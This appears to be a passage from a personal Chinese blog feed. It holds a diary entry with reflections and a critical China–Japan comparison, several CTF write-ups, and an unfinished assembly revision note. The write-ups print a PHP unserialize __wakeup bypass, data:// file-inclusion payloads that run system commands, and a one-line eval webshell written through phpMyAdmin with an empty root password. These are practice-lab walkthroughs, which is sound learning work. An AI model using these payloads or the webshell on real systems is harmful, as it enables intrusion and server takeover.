    <content type="html"><![CDATA[<p><img src="/images/Holo_2.png" alt="赫萝"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天看到qq音乐出了年度报告，虽然是一种典型的商业化行为，不过我倒是不怎么反感，能看到这一年里听音乐的变化，意味着感受到自己的变化，我想还是蛮有趣的。</p><h1 id="一年的音乐"><a href="#一年的音乐" class="headerlink" title="一年的音乐"></a>一年的音乐</h1><p>几个在意的数据：<br>年度关键词：<strong>自由</strong><br>年度歌曲：<strong>I Really Want to Stay at Your House</strong><br>年度歌手：<strong>Beyond</strong></p><p>从年度关键词看来看，“自由”并不是我嘴上说说而已呢hh，年度歌手一如既往，不出预料。<br>不过年度歌曲竟然是这首，看来无论是赛博朋克：边缘行者的动画，还是其歌曲，都给我带来很强的冲击力呢。<br>同时也侧面印证了我今年听音乐的集中度确实不多…</p><h1 id="自制力"><a href="#自制力" class="headerlink" title="自制力"></a>自制力</h1><p>有时，人并不是失去了自制力，而是没有找到真正想做的事。<br>人经常有这样的错觉，仿佛某件事做了一会儿，甚至还没开始，就放弃了，跑去娱乐。过去我常常认为这是缺乏自制力的表现，近来有了些不同的看法。<br>如果对于要做的这件事没有感觉甚至是抗拒的心理，强迫自己去做自然心理会有厌恶的想法。<br>没有热情也就没有动力。没有动力也就无法好好地完成它。相反，对于某件事如果充满热情，那我想，即便是想要偷懒的想法也不会滋生吧。<br>但是呢，只要活着，难免会有不想做却不得不做的事，一昧地想着“好不想做，好讨厌”以逃避的心态面对只会造成更难堪的局面，所以还是和解吧，至少不要调整好心态。<br>趁着还有能够充满热情的事物，全力去做吧~</p><h1 id="失去了看动漫的热情？"><a href="#失去了看动漫的热情？" class="headerlink" title="失去了看动漫的热情？"></a>失去了看动漫的热情？</h1><p>最近除了几部最近的新番不怎么看更多的动漫了，反而看起了以前看过的K-ON, Spice and Wolf…<br>是因为失去了尝试看新动漫的热情了吗？<br>人就是有这样的时候啊，也听说一些人曾经看很多anime，也慢慢不去看了。我想也许我正处于这个过程中。<br>不过我却不想失去这样的热情，哪怕是强迫自己，也要重拾那份快乐。<br>想到这，电视剧电影年复一年的出新，会不会有人也对其不再感冒呢，大概是有的吧。<br>人会对什么终其一生充满着热情呢？</p><h1 id="圣诞节"><a href="#圣诞节" class="headerlink" title="圣诞节"></a>圣诞节</h1><p>从何时开始，有了所谓不过“洋节”的说法呢？<br>我印象是2015年左右吧，那时开始产生了这样的说法。缘由是所谓的防止“文化入侵”，那时我不甚明白。<br>目的确实达到了，曾经在圣诞节这天，很多人都会互相祝福圣诞快乐，苹果以及其它节日的小玩意儿的卖价在这段日子也是连连攀升。而如今，大陆再没多少人在这天互相祝福了，甚至这样说的话，反而会显得怪尴尬的（比如我）。<br>不过今天的我，在增加了一点点阅历后，觉得这样做实属愚昧。好的文化自然广泛传播，以文化入侵的名义禁止也不能改变自身没有文化的现状。</p><h1 id="国与国的对比"><a href="#国与国的对比" class="headerlink" title="国与国的对比"></a>国与国的对比</h1><p>一直觉得日本与中国拿来对比是非常恰当的，距离很近，同处东亚，人口密度也很高，同样在二战中经历了巨大的创伤，文化方面也有许多相似之处。<br>结论是，我认为日本完胜中国。<br>这样的话，如果被放到其它地方，恐怕会被人一口唾沫淹死吧，不过嘛，在自己的领地上，我想怎么说怎么说，我才不管别人怎么想。<br>简单讨论几个对比的地方，</p><ol><li><p>人均<br>曾经听过很多这样的话，虽然中国地大物博，但是有很多荒地沙漠不能使用，人口密度大，所以是很多问题的原因啦之类的。<br>人口密度 每平方公里人数<br>中国 145<br>日本 344<br>如此看来，日本是中国人口密度的两倍有余，人均GDP依然远高于中国，我想，从这方面看来，人口密度大并非是很多问题的真正原因，恐怕只是一种托词罢了。或许有质疑声是中国的领土如此大，管理很困难，那么根据数据：<br>中国官民比例1：18<br>日本官民比例1：28<br>有如此多的人管理着平民，我想不应当再谈管理困难的事。<br>从这方面的话，中国人均GDP低另有他因，但我这里不想再讨论了。</p></li><li><p>文化<br>日本没有禁“洋节”，而自己的文化依然欣欣向荣，甚至传播到其它国家。<br>现代文化方面，日本动画漫画游戏等等，都是世界知名的，从中国的角度来说，这就是对其它国家“文化入侵”。而日本人也没有排斥这些洋节，圣诞依然张灯结彩。<br>中国的现代文化，我说的尖锐点，中国压根儿没什么现代文化。影视动画除了会把各朝各代或是神话故事之类的拿出来翻拍改编，也没什么花样了。啊对了，近几年倒是又新起红色影视剧，什么战狼2啊，长津湖啊…大概也就这样了吧。科幻方面只有少数如刘慈欣的《三体》在中国赞美连连，可最近的三体动画在某评分平台上仅有3分，也是沦为笑话了。小说漫画常年排在榜单里的不是什么后宫言情就是开挂修仙玄幻之类的垃圾玩意儿。差点忘了游戏方面，腾讯网易永远都被人骂不完，也永远赚得盆满钵满。做的那些狗屁东西除了在不是“封”就是“禁”的中国大陆能搞得火热之外，到了外面根本就没有市场。<br>一说起来就成了发泄情绪的话呢。还是收一收。总之，影视动画，小说漫画和游戏等软文化的东西，都能影响一个国家，大众整体的审美能力。不如说，也是体现了大众的审美能力。在我看来，如今的大陆民众，审美能力低下，和日本起码差了好几个level。可悲吗？可悲。但我再怎么担心也没用，就这样吧。<br>他们总是这样：没有什么，就要宣扬什么；掩饰什么，就要封禁什么。</p></li></ol><p>很多中国人不愿承认自己国家的缺陷，每次谈到不足糟糕的地方，通常会有以下几种反应：</p><ul><li>不承认。只要不是把确凿无疑的事实证据摆在他面前，总是会发出怀疑的声音，想以此来否定，不承认其糟糕。</li><li>别的国家也没做好&#x2F;也这样。当他对铁证如山的事实无可辩驳时，就开始逃避，说某某国家也这样啊，某某国家也没做得多好。</li><li>总说得好像没办法了似的或某某有其它的考虑。总是把某件事做得很糟糕归咎于外因，从不会反省自身没做好的地方。总是把一些糟糕的结果认为某官员某部门有他的“考虑”，经典话语之“下大棋”。</li><li>太过激了。终于以上所有退路都没堵住后，面对批判，又会有人冒出来说，“说得太过激了”，“虽然…是没错，但也不至于这么说吧”。我只觉搞笑，当这些人面对他们老师，他们领导这种，被痛骂一顿的时候他们敢还嘴说“太过激了”吗？怎么？只有上位者具有随心所欲批评的权利吗？作为遵纪守法的纳税人，连没做好都没资格说了吗？</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天一时来了兴致，写了这么久，写了一堆痛骂的话…既然写过一次了，以后尽可能少写。<br>早睡计划又失败了&#x2F;(ㄒoㄒ)&#x2F;~~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo_2.png&quot; alt=&quot;赫萝&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-unserialize3</title>
    <link href="http://example.com/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/"/>
    <id>http://example.com/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/</id>
    <published>2022-12-24T16:00:00.000Z</published>
    <updated>2022-12-25T16:40:18.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>是我做的第一道反序列化的ctf呢。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></li></ol><ul><li>__wakeup()魔术方法<br>简单来说，<br>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br><a href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html">详细解释</a></li></ul><p>根据源码可以看出，明显为反序列化漏洞，我们需要绕过__wakeup()方法，否则会直接退出，而正好该__wakeup方法有一个绕过方式，即：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。<br>那么首先需要实例化对象。</p><ol start="2"><li>构造payload<br>实例化对象，根据源码编辑php脚本输出序列化字符串：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>结果得到：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>增加对象属性个数，<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>将得到的字符串键值对输入url地址栏，即可得到flag：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>成功拿到flag</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;是我做的第一道反序列化的ctf呢。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_php_include</title>
    <link href="http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/"/>
    <id>http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/</id>
    <published>2022-12-23T16:00:00.000Z</published>
    <updated>2022-12-24T09:18:43.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础题，多种解法。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>strstr()函数<br>查找字符串的首次出现<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strstr(string $haystack, string $needle, bool $before_needle = false): string|fal</span><br><span class="line">返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。</span><br><span class="line">注意:</span><br><span class="line">该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</span><br></pre></td></tr></table></figure></li></ul><p>根据源码可知，我们可以传入两个参数hello,page<br>并且过滤了 <code>php://</code><br>虽然函数定义上区分大小写，但本关中使用大小写绕过并不能成功，于是我们可以换成data:</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure></li></ol><ul><li>system()函数<br>执行外部程序，并且显示输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(string $command, int &amp;$result_code = null): string|false</span><br><span class="line">同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。</span><br><span class="line"></span><br><span class="line">如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</span><br><span class="line"></span><br><span class="line">如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</span><br></pre></td></tr></table></figure></li><li>ls命令<br>ls命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</li></ul><p>因此该payload可以得到我们所需的文件：fl4gisisish3r3.php<br>之后再次构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>由此，可以在源码中拿到flag</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过扫描后台工具发现phpmyadmin后台<br>打开该后台,进入登录页面：<br><code>http://61.147.171.105:49265/phpmyadmin</code><br>username:root, password为空<br>之后进入SQL语句输入的地方，编辑一句话木马并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/tmp/123.php&#x27;</span><br></pre></td></tr></table></figure><p>使用 SELECT … INTO OUTFILE 语句导出数据到相应文件中。<br>打开蚁剑，url地址输入：<br><code>http://61.147.171.105:49265/?page=/tmp/123.php</code><br>密码为cmd<br>连接成功后，在www目录下找到fl4gisisish3r3.php<br>打开拿到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有些方法可以使用，这里不再列举，可以看看攻防世界的wp。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;基础题，多种解法。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_web2</title>
    <link href="http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/"/>
    <id>http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/</id>
    <published>2022-12-23T16:00:00.000Z</published>
    <updated>2022-12-24T07:39:56.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次密码破译，还是比较有趣的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>strrev()函数<br>反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strrev(string $string): string</span><br><span class="line">返回 string 反转后的字符串。</span><br></pre></td></tr></table></figure></li><li><p>ord()函数<br>转换字符串第一个字节为 0-255 之间的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ord(string $character): int</span><br><span class="line">解析 character 二进制值第一个字节为 0 到 255 范围的无符号整型类型。</span><br><span class="line"></span><br><span class="line">如果字符串是 ASCII、 ISO-8859、Windows 1252之类单字节编码，就等于返回该字符在字符集编码表中的位置。 但请注意，本函数不会去检测字符串的编码，尤其是不会识别类似 UTF-8 或 UTF-16 这种多字节字符的 Unicode 代码点（code point）。</span><br><span class="line"></span><br><span class="line">该函数是 chr() 的互补函数。</span><br></pre></td></tr></table></figure></li><li><p>chr()函数<br>从数字生成单字节字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chr(int $codepoint): string</span><br><span class="line">返回单字符字符串，包含将 codepoint 作为无符号整数解释的指定字符。</span><br><span class="line"></span><br><span class="line">这可用于在一种单字节编码（像是 ASCII、ISO-8859 或 Windows 1252）中通过传递想要的字符在编码映射表中的位置来创建单字符字符串。</span><br><span class="line">但是，注意此函数并不清楚任何字符串编码，特别是无法通过传递一个 Unicode 码位值来生成多字节编码（像是 UTF-8 或 UTF-16）字符串。</span><br><span class="line"></span><br><span class="line">此函数与 ord() 互补。</span><br></pre></td></tr></table></figure></li><li><p>str_rot13()函数<br>对字符串执行 ROT13 转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_rot13(string $string): string</span><br><span class="line">对 string 参数执行 ROT13 编码并将结果字符串返回。</span><br><span class="line"></span><br><span class="line">ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</span><br><span class="line">编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</span><br></pre></td></tr></table></figure></li></ul><p>根据提示可知，我们需要通过逆向加密算法解密变量miwen。</p><ol start="2"><li>解密</li></ol><ul><li>rot13解密，得到：(不可忽略字符大小写)<br><code>n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</code></li><li>倒转后，得到：<br><code>fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</code></li><li>base64解密后，得到：<br>~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg</li><li>所有字符的ASCII顺序减1，得到：<br>}77925d0af7327d30646c918bfda5d37b-FTCSN{:galf</li><li>再次倒转，得到：<br><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一次密码破译，还是比较有趣的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言期末复习</title>
    <link href="http://example.com/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    <id>http://example.com/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</id>
    <published>2022-12-16T16:00:00.000Z</published>
    <updated>2022-12-17T15:32:55.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p><span id="more"></span><h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="源码、反码、补码、移码之间的转换"><a href="#源码、反码、补码、移码之间的转换" class="headerlink" title="源码、反码、补码、移码之间的转换"></a>源码、反码、补码、移码之间的转换</h2><p>源码为正数时，<br>源码&#x3D;反码&#x3D;补码，移码&#x3D;补码+127<br>源码为负数时，<br>反码：符号位不变，其它位取反<br>补码：反码+1<br>移码：补码符号位取反</p><h2 id="有符号字节-amp-字"><a href="#有符号字节-amp-字" class="headerlink" title="有符号字节 &amp; 字"></a>有符号字节 &amp; 字</h2><ul><li>有符号字节<br>数值范围：-128<del>127或-2^7</del>2^7-1</li><li>有符号字<br>数值范围：-32768<del>32767或-2^15</del>2^15-1</li></ul><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>计算机采用字符集的方式表示字符。<br>所谓字符集，就是一张映射表，用哪个数字表示哪个符号<br>常用字符集有：ASCII，ANSI，Unicode，GB2312，UTF-8</p><h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ol><li>保护模式。处理器的基本模式，所有指令和特性均相同，程序具备独立的内存段，地址线32位，4GB地址空间。</li><li>虚拟8086模式。是保护模式的一个特例，处理器可以安全地在多任务系统中执行实地址模式的软件，而不会影响其它运行的程序，地址线20位，1MB地址空间。</li><li>实地址模式。具有基本x86处理器环境和一些新增的特性，能够直接访问内存和硬件资源，地址线20位，1MB地址空间。</li><li>系统管理模式。实现电源管理和系统安全等。</li></ol><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/simg/Assembly_1.png" alt="通用寄存器"></p><h2 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h2><p>进位标志位(CF)，与目标位置相比，无符号算数运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算符太大或太小时，设置该标志位。</p><p>完全不想写了…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;烦内！一到期末就不想复习了，真是的。&lt;br&gt;还是要强迫自己学习哇。&lt;/p&gt;</summary>
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="汇编语言" scheme="http://example.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>走走停停</title>
    <link href="http://example.com/2022/12/16/Diary_1216/"/>
    <id>http://example.com/2022/12/16/Diary_1216/</id>
    <published>2022-12-15T16:00:00.000Z</published>
    <updated>2022-12-16T18:27:10.388Z</updated>
    
